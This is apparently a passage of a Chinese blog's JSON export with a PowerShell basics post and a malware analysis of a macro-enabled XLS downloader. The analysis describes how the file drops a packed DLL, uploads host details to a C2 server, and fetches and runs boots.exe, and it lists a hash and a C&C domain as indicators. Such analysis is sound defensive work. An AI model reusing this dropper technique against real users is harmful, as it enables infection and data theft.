title=\"shellcode 基础\"></a>shellcode 基础</h3><p>参考微软<a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/how-to-use-docs?view=powershell-7\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<p>几个特性：</p>\n<blockquote>\n<ol>\n<li>.NET Core可跨平台，powershell6可在Mac Linux平台使用，大气</li>\n<li>Win10自带组建，功能强大</li>\n</ol>\n</blockquote>\n<h4 id=\"了解Powershell\"><a href=\"#了解Powershell\" class=\"headerlink\" title=\"了解Powershell\"></a>了解Powershell</h4><ol>\n<li>输出基于对象<ul>\n<li>PowerShell cmdlet 旨在处理对象</li>\n<li>在大多数情况下，可以使用标准 PowerShell 对象语法直接访问数据的各部分</li>\n</ul>\n</li>\n<li>命令系列是可扩展的<ul>\n<li>可以自己实现函数</li>\n<li>支持批处理文件的脚本</li>\n</ul>\n</li>\n<li>PowerShell 处理控制台输入和显示<ul>\n<li>在cmdlet 后使用 <strong>-？</strong>可显示关于此命令的帮助</li>\n</ul>\n</li>\n<li>PowerShell 使用某些 C# 语法</li>\n</ol>\n<h4 id=\"了解powershell的名称\"><a href=\"#了解powershell的名称\" class=\"headerlink\" title=\"了解powershell的名称\"></a>了解powershell的名称</h4><pre><code> 1. Cmdlet 使用谓词-名词的名称来减少命令记忆\n - [PowerShell 批准的谓词]( https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 )\n 2. Cmdlet 使用标准参数\n - 参数主要通过**-？**获取，还有通用参数如 WhatIf、Confirm、Verbose、Debug、Warn、ErrorAction、ErrorVariable、OutVariable 和 OutBuffer\n3. 建议的参数名称\n-   加上方便人理解： Force 、Exclude 、Include 、PassThru 、Path 和 CaseSensitive </code></pre><h4 id=\"使用熟悉的命令名称\"><a href=\"#使用熟悉的命令名称\" class=\"headerlink\" title=\"使用熟悉的命令名称\"></a>使用熟悉的命令名称</h4><p>​    <strong>1. Powershell 支持常见的Unix 和cmd.exe 的命令</strong></p>\n<p>​    </p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">cat</td>\n<td align=\"left\">dir</td>\n<td align=\"left\">mount</td>\n<td align=\"left\">rm</td>\n</tr>\n<tr>\n<td align=\"left\">cd</td>\n<td align=\"left\">echo</td>\n<td align=\"left\">move</td>\n<td align=\"left\">rmdir</td>\n</tr>\n<tr>\n<td align=\"left\">chdir</td>\n<td align=\"left\">erase</td>\n<td align=\"left\">popd</td>\n<td align=\"left\">sleep</td>\n</tr>\n<tr>\n<td align=\"left\">clear</td>\n<td align=\"left\">h</td>\n<td align=\"left\">ps</td>\n<td align=\"left\">sort</td>\n</tr>\n<tr>\n<td align=\"left\">cls</td>\n<td align=\"left\">history</td>\n<td align=\"left\">pushd</td>\n<td align=\"left\">tee</td>\n</tr>\n<tr>\n<td align=\"left\">copy</td>\n<td align=\"left\">kill</td>\n<td align=\"left\">pwd</td>\n<td align=\"left\">type</td>\n</tr>\n<tr>\n<td align=\"left\">del</td>\n<td align=\"left\">lp</td>\n<td align=\"left\">r</td>\n<td align=\"left\">write</td>\n</tr>\n<tr>\n<td align=\"left\">diff</td>\n<td align=\"left\">ls</td>\n<td align=\"left\">ren</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li><p>别名相关操作</p>\n<p> <code>Get-Command -Noun Alias</code></p>\n</li>\n</ol>\n<h4 id=\"获取详细的帮助信息\"><a href=\"#获取详细的帮助信息\" class=\"headerlink\" title=\"获取详细的帮助信息\"></a>获取详细的帮助信息</h4><ol>\n<li>获取有关 cmdlet 的帮助<ul>\n<li>常规帮助 <strong>Get-Help cmdlet</strong>、<strong>man cmdlet</strong> 、<strong>cmdlet   -?</strong> </li>\n<li>获取到参数的帮助  <strong>Get-Help cmdlet -Full</strong> </li>\n</ul>\n</li>\n</ol>\n<h4 id=\"使用变量存储对象\"><a href=\"#使用变量存储对象\" class=\"headerlink\" title=\"使用变量存储对象\"></a>使用变量存储对象</h4><ol>\n<li>使用<strong>$</strong>表示变量</li>\n<li>Get-Member $env:获取变量的信息<ul>\n<li>可以创建设置键值对，例：<code>$env:LIB_PATH=&#39;/usr/local/lib&#39;</code></li>\n</ul>\n</li>\n</ol>\n<h4 id=\"了解-PowerShell-管道\"><a href=\"#了解-PowerShell-管道\" class=\"headerlink\" title=\"了解 PowerShell 管道\"></a>了解 PowerShell 管道</h4><p>​    主要是方法和属性的使用，下面举个例子</p>\n<p>​    <code>Get-Location</code> 获取一个pathInfo</p>\n<p>​    <code>Get-Location | Get-Member</code>获取这个类的方法和属性</p>\n<p>​    想要使用必须先实例化，传给一个变量</p>\n<p>​    <code>$myLocal = Get-Location</code>实例化，这个<code>$myLocal</code>拥有<code>Get-Location</code>的全部方法和属性</p>\n<p>​    比如<code>$myloc.Drive.Used</code>获取所在驱动内存使用大小，通过<code>Get-Member</code>获取详情</p>\n<h4 id=\"术语表\"><a href=\"#术语表\" class=\"headerlink\" title=\"术语表\"></a>术语表</h4><p>powershell的常用术语</p>\n<p>建议中英对照看，翻译的有些不易理解</p>\n<p><a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/learn/windows-powershell-glossary?view=powershell-7\" target=\"_blank\" rel=\"noopener\">中文</a></p>\n<p><a href=\"https://docs.microsoft.com/en-us/powershell/scripting/learn/windows-powershell-glossary?view=powershell-77\" target=\"_blank\" rel=\"noopener\">英文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"shellcode-基础\"><a href=\"#shellcode-基础\" class=\"headerlink\" title=\"shellcode 基础\"></a>shellcode 基础</h3><p>参考微软<a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/how-to-use-docs?view=powershell-7\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<p>几个特性：</p>\n<blockquote>\n<ol>\n<li>.NET Core可跨平台，powershell6可在Mac Linux平台使用，大气</li>\n<li>Win10自带组建，功能强大</li>\n</ol>\n</blockquote>\n<h4 id=\"了解Powershell\"><a href=\"#了解Powershell\" class=\"headerlink\" title=\"了解Powershell\"></a>了解Powershell</h4><ol>\n<li>输出基于对象<ul>\n<li>PowerShell cmdlet 旨在处理对象</li>\n<li>在大多数情况下，可以使用标准 PowerShell 对象语法直接访问数据的各部分</li>\n</ul>\n</li>\n<li>命令系列是可扩展的<ul>\n<li>可以自己实现函数</li>\n<li>支持批处理文件的脚本</li>\n</ul>\n</li>\n<li>PowerShell 处理控制台输入和显示<ul>\n<li>在cmdlet 后使用 <strong>-？</strong>可显示关于此命令的帮助</li>\n</ul>\n</li>\n<li>PowerShell 使用某些 C# 语法</li>\n</ol>\n<h4 id=\"了解powershell的名称\"><a href=\"#了解powershell的名称\" class=\"headerlink\" title=\"了解powershell的名称\"></a>了解powershell的名称</h4><pre><code> 1. Cmdlet 使用谓词-名词的名称来减少命令记忆\n - [PowerShell 批准的谓词]( https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 )\n 2. Cmdlet 使用标准参数\n - 参数主要通过**-？**获取，还有通用参数如 WhatIf、Confirm、Verbose、Debug、Warn、ErrorAction、ErrorVariable、OutVariable 和 OutBuffer\n3. 建议的参数名称\n-   加上方便人理解： Force 、Exclude 、Include 、PassThru 、Path 和 CaseSensitive </code></pre><h4 id=\"使用熟悉的命令名称\"><a href=\"#使用熟悉的命令名称\" class=\"headerlink\" title=\"使用熟悉的命令名称\"></a>使用熟悉的命令名称</h4><p>​    <strong>1. Powershell 支持常见的Unix 和cmd.exe 的命令</strong></p>\n<p>​    </p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">cat</td>\n<td align=\"left\">dir</td>\n<td align=\"left\">mount</td>\n<td align=\"left\">rm</td>\n</tr>\n<tr>\n<td align=\"left\">cd</td>\n<td align=\"left\">echo</td>\n<td align=\"left\">move</td>\n<td align=\"left\">rmdir</td>\n</tr>\n<tr>\n<td align=\"left\">chdir</td>\n<td align=\"left\">erase</td>\n<td align=\"left\">popd</td>\n<td align=\"left\">sleep</td>\n</tr>\n<tr>\n<td align=\"left\">clear</td>\n<td align=\"left\">h</td>\n<td align=\"left\">ps</td>\n<td align=\"left\">sort</td>\n</tr>\n<tr>\n<td align=\"left\">cls</td>\n<td align=\"left\">history</td>\n<td align=\"left\">pushd</td>\n<td align=\"left\">tee</td>\n</tr>\n<tr>\n<td align=\"left\">copy</td>\n<td align=\"left\">kill</td>\n<td align=\"left\">pwd</td>\n<td align=\"left\">type</td>\n</tr>\n<tr>\n<td align=\"left\">del</td>\n<td align=\"left\">lp</td>\n<td align=\"left\">r</td>\n<td align=\"left\">write</td>\n</tr>\n<tr>\n<td align=\"left\">diff</td>\n<td align=\"left\">ls</td>\n<td align=\"left\">ren</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li><p>别名相关操作</p>\n<p> <code>Get-Command -Noun Alias</code></p>\n</li>\n</ol>\n<h4 id=\"获取详细的帮助信息\"><a href=\"#获取详细的帮助信息\" class=\"headerlink\" title=\"获取详细的帮助信息\"></a>获取详细的帮助信息</h4><ol>\n<li>获取有关 cmdlet 的帮助<ul>\n<li>常规帮助 <strong>Get-Help cmdlet</strong>、<strong>man cmdlet</strong> 、<strong>cmdlet   -?</strong> </li>\n<li>获取到参数的帮助  <strong>Get-Help cmdlet -Full</strong> </li>\n</ul>\n</li>\n</ol>\n<h4 id=\"使用变量存储对象\"><a href=\"#使用变量存储对象\" class=\"headerlink\" title=\"使用变量存储对象\"></a>使用变量存储对象</h4><ol>\n<li>使用<strong>$</strong>表示变量</li>\n<li>Get-Member $env:获取变量的信息<ul>\n<li>可以创建设置键值对，例：<code>$env:LIB_PATH=&#39;/usr/local/lib&#39;</code></li>\n</ul>\n</li>\n</ol>\n<h4 id=\"了解-PowerShell-管道\"><a href=\"#了解-PowerShell-管道\" class=\"headerlink\" title=\"了解 PowerShell 管道\"></a>了解 PowerShell 管道</h4><p>​    主要是方法和属性的使用，下面举个例子</p>\n<p>​    <code>Get-Location</code> 获取一个pathInfo</p>\n<p>​    <code>Get-Location | Get-Member</code>获取这个类的方法和属性</p>\n<p>​    想要使用必须先实例化，传给一个变量</p>\n<p>​    <code>$myLocal = Get-Location</code>实例化，这个<code>$myLocal</code>拥有<code>Get-Location</code>的全部方法和属性</p>\n<p>​    比如<code>$myloc.Drive.Used</code>获取所在驱动内存使用大小，通过<code>Get-Member</code>获取详情</p>\n<h4 id=\"术语表\"><a href=\"#术语表\" class=\"headerlink\" title=\"术语表\"></a>术语表</h4><p>powershell的常用术语</p>\n<p>建议中英对照看，翻译的有些不易理解</p>\n<p><a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/learn/windows-powershell-glossary?view=powershell-7\" target=\"_blank\" rel=\"noopener\">中文</a></p>\n<p><a href=\"https://docs.microsoft.com/en-us/powershell/scripting/learn/windows-powershell-glossary?view=powershell-77\" target=\"_blank\" rel=\"noopener\">英文</a></p>\n"},{"title":"利用宏-DownLoder","index_img":"https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_4fc6282a45.jpg","banner_img":"https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_4fc6282a45.jpg","date":"2019-10-10T02:00:00.000Z","_content":"\n\n## 基本信息\n\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n|58e4d0.xls | Downloader|3effeba64d9a1a4dd1bddaeb1858e4d0|346112  bytes|\n\n## 简介\n带有恶意宏的office文件，加载dll，下载程序执行\n\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920145944891.png)\n\n## 详细分析\n\n有宏，会在你允许宏运行的时候执行起来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918202734525.png)\n首先会切换目录到`TMPT`下\n\n然后会调用窗体`UserFrom1`的`Show`方法,也就值展示提示窗体\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918202835482.png)\n在展示的时候会执行`UserFrom_Activate()`函数，也就会调用`CreatGifFile`这个方法\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918202716893.png)\n这个方法在模块 modle1中定义\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918203052154.png)\n拼接在`TEMP`下的路径，根据系统位数走不同分支，我这里是win7 32位\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918203729411.png)\n下面会拷贝本身到上面拼接好的路径 `TempName`中，然后复制到`ZipName`中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918205110760.png)\n会把`ZipName`文件按压缩包打开，取出`xl\\embeddings\\oleObject1.bin`保存到`Tmp\\oleObject.bin`中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918205329214.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918205648726.png)\n最后会调用`ReadAndWriteExtractedBinFile`函数，这个函数是在`oleObject.bin`中找到MZ开头的字符区，然后读取指定字节保存\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918210305935.png)\n定义好MZ头标记，方便后面查找\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918210330686.png)\n循环查找`oleObject.bin`中MZ开头的数据，然后拷贝到`NewAr`数组中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918210842310.png)\n将数组中的数据保存到`nm`中，也就是 `%APPDATA %+\\exchange1.dll`\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918211005818.png)\n然后程序返回`CreateGifFile`来执行关键代码，`k32LL`和`Amway` 都在模块2中定义\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918211226396.png)\n`k32LL()`其实是C语言中的`LoadLibraryW()`\n`Amway`则是这个dll的一个导出函数\n\n### exchange1.dll\n有壳，先脱壳，这里就说说思路\n\n这个壳动态开辟空间，将加密的代码放到这个新开空间中，找准时机，dump出来\n\n然后你会发现还有UPX的壳，UPX就是容易了\n\n脱完壳之后看导出表\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212420668.png)\n到这里就可以看出来`Amway`其实是这个dll的到导出函数了\n\n**这个dll是个下载器，能够下载程序执行**\n\n但是首先会获取一系列系统信息\n\n获取主机名\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212558142.png)\n获取用户名\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212740460.png)\n获取系统版本信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212819680.png)\n枚举进程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212846287.png)\n然后将进程名按 `|`号隔开\n![在这里插入图片描述](https://img-blog.csdnimg.cn/201909192130056.png)\n后面就开始构造上传数据头了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919213616330.png)\n开始上传本机信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919213725137.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919213759624.png)\n上传后会检测response的状态码是否是正常(200)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214012375.png)\n当上传配置后会get一个文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214254175.png)\n这里会创建一个`%temp%\\boots.exe`文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214316698.png)\n打开文件，往里面写下载的数据\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214453138.png)\n下面就是核心的地方了，新开一个进程，去执行这个下载的exe程序\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214602693.png)\n\n由于目前这个C2地址已经失效，无法获得下载数据，但是能肯定的是这个下载程序才是这个木马的核心，因为这个宏代码中没有用做任何持久化处理。\n\n## IOC\n|域名|类型  |\n|--|--|\n|https://office-teml-en.com/tw| C&C |\n\n\n## 总结\n该木马利用加载隐藏在xlsx中的dll来执行命令，根据不同系统释放不同文件，利用网络存储，可以随时改变攻击方式。\n我们要时刻保持警惕，对未知文件保持怀疑的态度，安装安全软件。\n","source":"_posts/宏病毒下载器.md","raw":"\n---\ntitle: 利用宏-DownLoder\ntags: [Hexo, Fluid]\nindex_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_4fc6282a45.jpg\nbanner_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_4fc6282a45.jpg\ndate: 2019-10-10 10:00:00\n---\n\n\n## 基本信息\n\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n|58e4d0.xls | Downloader|3effeba64d9a1a4dd1bddaeb1858e4d0|346112  bytes|\n\n## 简介\n带有恶意宏的office文件，加载dll，下载程序执行\n\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920145944891.png)\n\n## 详细分析\n\n有宏，会在你允许宏运行的时候执行起来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918202734525.png)\n首先会切换目录到`TMPT`下\n\n然后会调用窗体`UserFrom1`的`Show`方法,也就值展示提示窗体\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918202835482.png)\n在展示的时候会执行`UserFrom_Activate()`函数，也就会调用`CreatGifFile`这个方法\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918202716893.png)\n这个方法在模块 modle1中定义\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918203052154.png)\n拼接在`TEMP`下的路径，根据系统位数走不同分支，我这里是win7 32位\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918203729411.png)\n下面会拷贝本身到上面拼接好的路径 `TempName`中，然后复制到`ZipName`中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918205110760.png)\n会把`ZipName`文件按压缩包打开，取出`xl\\embeddings\\oleObject1.bin`保存到`Tmp\\oleObject.bin`中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918205329214.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918205648726.png)\n最后会调用`ReadAndWriteExtractedBinFile`函数，这个函数是在`oleObject.bin`中找到MZ开头的字符区，然后读取指定字节保存\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918210305935.png)\n定义好MZ头标记，方便后面查找\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918210330686.png)\n循环查找`oleObject.bin`中MZ开头的数据，然后拷贝到`NewAr`数组中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918210842310.png)\n将数组中的数据保存到`nm`中，也就是 `%APPDATA %+\\exchange1.dll`\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918211005818.png)\n然后程序返回`CreateGifFile`来执行关键代码，`k32LL`和`Amway` 都在模块2中定义\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190918211226396.png)\n`k32LL()`其实是C语言中的`LoadLibraryW()`\n`Amway`则是这个dll的一个导出函数\n\n### exchange1.dll\n有壳，先脱壳，这里就说说思路\n\n这个壳动态开辟空间，将加密的代码放到这个新开空间中，找准时机，dump出来\n\n然后你会发现还有UPX的壳，UPX就是容易了\n\n脱完壳之后看导出表\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212420668.png)\n到这里就可以看出来`Amway`其实是这个dll的到导出函数了\n\n**这个dll是个下载器，能够下载程序执行**\n\n但是首先会获取一系列系统信息\n\n获取主机名\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212558142.png)\n获取用户名\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212740460.png)\n获取系统版本信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212819680.png)\n枚举进程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919212846287.png)\n然后将进程名按 `|`号隔开\n![在这里插入图片描述](https://img-blog.csdnimg.cn/201909192130056.png)\n后面就开始构造上传数据头了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919213616330.png)\n开始上传本机信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919213725137.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919213759624.png)\n上传后会检测response的状态码是否是正常(200)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214012375.png)\n当上传配置后会get一个文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214254175.png)\n这里会创建一个`%temp%\\boots.exe`文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214316698.png)\n打开文件，往里面写下载的数据\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214453138.png)\n下面就是核心的地方了，新开一个进程，去执行这个下载的exe程序\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919214602693.png)\n\n由于目前这个C2地址已经失效，无法获得下载数据，但是能肯定的是这个下载程序才是这个木马的核心，因为这个宏代码中没有用做任何持久化处理。\n\n## IOC\n|域名|类型  |\n|--|--|\n|https://office-teml-en.com/tw| C&C |\n\n\n## 总结\n该木马利用加载隐藏在xlsx中的dll来执行命令，根据不同系统释放不同文件，利用网络存储，可以随时改变攻击方式。\n我们要时刻保持警惕，对未知文件保持怀疑的态度，安装安全软件。\n","slug":"宏病毒下载器","published":1,"updated":"2019-12-10T11:20:58.040Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62y001hccuqyzpkgqwk","content":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>58e4d0.xls</td>\n<td>Downloader</td>\n<td>3effeba64d9a1a4dd1bddaeb1858e4d0</td>\n<td>346112  bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>带有恶意宏的office文件，加载dll，下载程序执行</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190920145944891.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>有宏，会在你允许宏运行的时候执行起来<br><img src=\"https://img-blog.csdnimg.cn/20190918202734525.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>首先会切换目录到<code>TMPT</code>下</p>\n<p>然后会调用窗体<code>UserFrom1</code>的<code>Show</code>方法,也就值展示提示窗体<br><img src=\"https://img-blog.csdnimg.cn/20190918202835482.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>在展示的时候会执行<code>UserFrom_Activate()</code>函数，也就会调用<code>CreatGifFile</code>这个方法<br><img src=\"https://img-blog.csdnimg.cn/20190918202716893.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这个方法在模块 modle1中定义<br><img src=\"https://img-blog.csdnimg.cn/20190918203052154.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>拼接在<code>TEMP</code>下的路径，根据系统位数走不同分支，我这里是win7 32位<br><img src=\"https://img-blog.csdnimg.cn/20190918203729411.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>下面会拷贝本身到上面拼接好的路径 <code>TempName</code>中，然后复制到<code>ZipName</code>中<br><img src=\"https://img-blog.csdnimg.cn/20190918205110760.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会把<code>ZipName</code>文件按压缩包打开，取出<code>xl\\embeddings\\oleObject1.bin</code>保存到<code>Tmp\\oleObject.bin</code>中<br><img src=\"https://img-blog.csdnimg.cn/20190918205329214.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190918205648726.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>最后会调用<code>ReadAndWriteExtractedBinFile</code>函数，这个函数是在<code>oleObject.bin</code>中找到MZ开头的字符区，然后读取指定字节保存<br><img src=\"https://img-blog.csdnimg.cn/20190918210305935.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>定义好MZ头标记，方便后面查找<br><img src=\"https://img-blog.csdnimg.cn/20190918210330686.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>循环查找<code>oleObject.bin</code>中MZ开头的数据，然后拷贝到<code>NewAr</code>数组中<br><img src=\"https://img-blog.csdnimg.cn/20190918210842310.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>将数组中的数据保存到<code>nm</code>中，也就是 <code>%APPDATA %+\\exchange1.dll</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190918211005818.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>然后程序返回<code>CreateGifFile</code>来执行关键代码，<code>k32LL</code>和<code>Amway</code> 都在模块2中定义<br><img src=\"https://img-blog.csdnimg.cn/20190918211226396.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><code>k32LL()</code>其实是C语言中的<code>LoadLibraryW()</code><br><code>Amway</code>则是这个dll的一个导出函数</p>\n<h3 id=\"exchange1-dll\"><a href=\"#exchange1-dll\" class=\"headerlink\" title=\"exchange1.dll\"></a>exchange1.dll</h3><p>有壳，先脱壳，这里就说说思路</p>\n<p>这个壳动态开辟空间，将加密的代码放到这个新开空间中，找准时机，dump出来</p>\n<p>然后你会发现还有UPX的壳，UPX就是容易了</p>\n<p>脱完壳之后看导出表<br><img src=\"https://img-blog.csdnimg.cn/20190919212420668.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>到这里就可以看出来<code>Amway</code>其实是这个dll的到导出函数了</p>\n<p><strong>这个dll是个下载器，能够下载程序执行</strong></p>\n<p>但是首先会获取一系列系统信息</p>\n<p>获取主机名<br><img src=\"https://img-blog.csdnimg.cn/20190919212558142.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>获取用户名<br><img src=\"https://img-blog.csdnimg.cn/20190919212740460.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>获取系统版本信息<br><img src=\"https://img-blog.csdnimg.cn/20190919212819680.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>枚举进程<br><img src=\"https://img-blog.csdnimg.cn/20190919212846287.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>然后将进程名按 <code>|</code>号隔开<br><img src=\"https://img-blog.csdnimg.cn/201909192130056.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>后面就开始构造上传数据头了<br><img src=\"https://img-blog.csdnimg.cn/20190919213616330.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>开始上传本机信息<br><img src=\"https://img-blog.csdnimg.cn/20190919213725137.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190919213759624.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>上传后会检测response的状态码是否是正常(200)<br><img src=\"https://img-blog.csdnimg.cn/20190919214012375.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>当上传配置后会get一个文件<br><img src=\"https://img-blog.csdnimg.cn/20190919214254175.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里会创建一个<code>%temp%\\boots.exe</code>文件<br><img src=\"https://img-blog.csdnimg.cn/20190919214316698.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>打开文件，往里面写下载的数据<br><img src=\"https://img-blog.csdnimg.cn/20190919214453138.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>下面就是核心的地方了，新开一个进程，去执行这个下载的exe程序</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190919214602693.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>由于目前这个C2地址已经失效，无法获得下载数据，但是能肯定的是这个下载程序才是这个木马的核心，因为这个宏代码中没有用做任何持久化处理。</p>\n<h2 id=\"IOC\"><a href=\"#IOC\" class=\"headerlink\" title=\"IOC\"></a>IOC</h2><table>\n<thead>\n<tr>\n<th>域名</th>\n<th>类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://office-teml-en.com/tw\" target=\"_blank\" rel=\"noopener\">https://office-teml-en.com/tw</a></td>\n<td>C&amp;C</td>\n</tr>\n</tbody></table>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>该木马利用加载隐藏在xlsx中的dll来执行命令，根据不同系统释放不同文件，利用网络存储，可以随时改变攻击方式。<br>我们要时刻保持警惕，对未知文件保持怀疑的态度，安装安全软件。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>58e4d0.xls</td>\n<td>Downloader</td>\n<td>3effeba64d9a1a4dd1bddaeb1858e4d0</td>\n<td>346112  bytes</td>\n</tr>\n</tbody></table>\n<h2 